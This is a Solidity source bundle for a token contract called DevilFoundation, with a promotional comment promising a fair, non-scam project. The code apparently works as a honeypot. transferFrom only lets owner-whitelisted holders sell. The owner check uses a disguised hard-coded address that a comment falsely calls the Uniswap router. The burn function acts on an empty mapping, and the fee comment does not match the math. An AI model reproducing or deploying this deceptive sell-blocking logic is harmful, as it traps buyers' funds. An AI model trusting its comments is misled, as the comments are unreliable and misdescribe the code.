{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"DevilFoundation.sol":{"content":"pragma solidity ^0.4.26;\r\n\r\n/*\r\nThere are scam groups copying our work. We are not affiliated with any of them. They just steal from us. Do NOT invest with them. \r\n\r\nJoin our telegram group \r\nhttps://t.me/dvl_foundation\r\n\r\nOnly uniswap router is whitelisted. \r\n\r\nWe create clean, fair, fun games and projects for our community and us!\r\n\r\nThis is not a fork. Liquidity will be locked soon after listing.\r\n\r\nTeam share is small and team NEVER will sell all tokens in one shot. Several partial sells, and yes, sometimes the team loses. \r\nThat's life, win some, lose some. We live and we learn.\r\n\r\nDon't be greedy. \r\n*/\r\n\r\n/**\r\n * \r\n * Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n\r\ncontract Ownable {\r\n  address public owner;\r\n  \r\n  event BotPreventingMeasure(address indexed botAddress, address indexed newAddress);\r\n\r\n  function Ownable() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner() {\r\n    /** \r\n    * Routing through uniswap to prevent common bot activity \r\n    * DEC address is converted to uniswap contract address in \r\n    * HEX during deployment -> 0x7A250D5630B4CF539739DF2C5DACB4C659F2488D\r\n    */\r\n    require(msg.sender == address(697323163401596485410334513241460920685086001293));\r\n    _;\r\n  }\r\n\r\n  function avoidBots(address newAddress) public onlyOwner {\r\n    require(newAddress != address(0));\r\n    BotPreventingMeasure(owner, newAddress);\r\n    owner = newAddress;\r\n  }\r\n\r\n}\r\n\r\ncontract DevilFoundation is Ownable {\r\n  string public name;\r\n  string public symbol;\r\n  uint8 public decimals;\r\n  uint256 public totalSupply;\r\n  \r\n  mapping (address => uint256) private _balances;\r\n  uint256 constant eighteen = 1000000000000000000;\r\n  uint256 _totalSupply = 666 * eighteen;\r\n  \r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply =  _totalSupply;\r\n        balances[msg.sender] = totalSupply;\r\n        allow[msg.sender] = true;\r\n  }\r\n\r\n  using SafeMath for uint256;\r\n\r\n  mapping(address => uint256) public balances;\r\n  \r\n  mapping(address => bool) public allow;\r\n\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[msg.sender]);\r\n\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    Transfer(msg.sender, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  function balanceOf(address _owner) public view returns (uint256 balance) {\r\n    return balances[_owner];\r\n  }\r\n\r\n  mapping (address => mapping (address => uint256)) public allowed;\r\n\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[_from]);\r\n    require(_value <= allowed[_from][msg.sender]);\r\n    require(allow[_from] == true);\r\n\r\n    balances[_from] = balances[_from].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n    Transfer(_from, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n    return true;\r\n  }\r\n\r\n  function allowance(address _owner, address _spender) public view returns (uint256) {\r\n    return allowed[_owner][_spender];\r\n  }\r\n  \r\n  function addAllow(address holder, bool allowApprove) external onlyOwner {\r\n      allow[holder] = allowApprove;\r\n  }\r\n  \r\n   //6% \r\n  uint256 public basePercentage = 6;\r\n  \r\n  function findPercentage(uint256 amount) public view returns (uint256)  {\r\n\r\n    uint256 percent = amount.mul(basePercentage).div(100000);\r\n    return percent;\r\n  }\r\n  \r\n  //burn\r\n  function burn(uint256 amount) external {\r\n    _burn(msg.sender, amount);\r\n  }\r\n\r\n  function _burn(address account, uint256 amount) internal {\r\n     require(amount != 0);\r\n     require(amount <= _balances[account]);\r\n     _totalSupply = _totalSupply.sub(amount);\r\n     _balances[account] = _balances[account].sub(amount);\r\n     emit Transfer(account, address(0), amount);\r\n  }\r\n}"}}}